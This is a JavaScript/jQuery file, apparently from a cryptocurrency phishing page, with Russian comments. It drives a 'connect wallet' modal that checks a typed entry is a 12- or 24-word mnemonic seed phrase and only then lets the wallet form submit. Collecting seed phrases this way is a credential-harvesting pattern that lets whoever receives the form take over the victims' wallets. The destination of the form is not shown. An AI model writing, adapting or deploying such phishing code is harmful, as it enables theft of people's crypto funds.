$("body").on("input", ".input-words", function () {
  this.value = this.value.replace(/[^a-z\s]/gi, "");
});

var wal = null;
var warn_icon = null;
var warn_text = null;
var shown = false;
var form = null;
var but = null;
var field = null;
const disable_button = e => but.attr('disabled', 'disabled');
const enable_button = e => but.removeAttr('disabled');

function show_warning(text){
  if (text){
    warn_text.html(text);
  }
  shown = true;
  warn_icon.stop().fadeIn(200);
  warn_text.stop().fadeIn(200);
}

function hide_warning(){
  shown = false;
  warn_icon.stop().fadeOut(200);
  warn_text.stop().fadeOut(200);
}

(function () {
  var max = 10,
    count = 0,
    input = null,
    result = null;

  function input_size(input){
    return input.trim().split(" ").length;
  }

  function compare_input(input){
    var size = input_size(input);

    if (size == 12 || size == 24){
      return true;
    }

    return false;
  }

  function on_change(var1){
    let cmp = compare_input($(this).val());

    if (cmp == false){
      disable_button();
      show_warning(); 
    } else {
      hide_warning();
      enable_button();
    }

    
  }

  function init() {
    //input = document.querySelector('#inp');
    //result = document.querySelector('#count');

    //input.addEventListener('keyup', keyup);
    
    wal = $("#wallet_modal");
    warn_icon = $("#input_alert");
    warn_text = $("#input_warning");
    but = $("#subm_button");

    $("#connect_btn").click(() => {
      wal.fadeIn(300);
    });
    $("#connect_btn2").click(() => {
      wal.fadeIn(300);
    });
    $("#wallet_modal").click(function(e){

      if (e.target == $(this)[0]){
        $(this).fadeOut(300);
      }
      
    });

    field = $("#password_field");
    field.on('input', on_change);
    
    form = $("#wallet_form");

    form.on('submit', (e) => {
      if (compare_input(field.val())){
        return true;
      }
      e.preventDefault();
      return false;
    });
  }

  function keyup(e) {
    if ((count = getNumOfComma(this.value)) >= max) {
      result.innerHTML = '<strong>Invalid mnemonic phrase</strong>'; // Лимит превышен
    } else {
      result.innerHTML = count; // Всё пучком, пиши дальше
    }
  }

  function getNumOfComma(value) {
    var ch, i = 0;

    for (ch in value) {
      ch = value[ch];

      if (ch == ' ' || ch == ' ')
        i++;
    }

    return i;
  }

  $(document).ready(init);
}());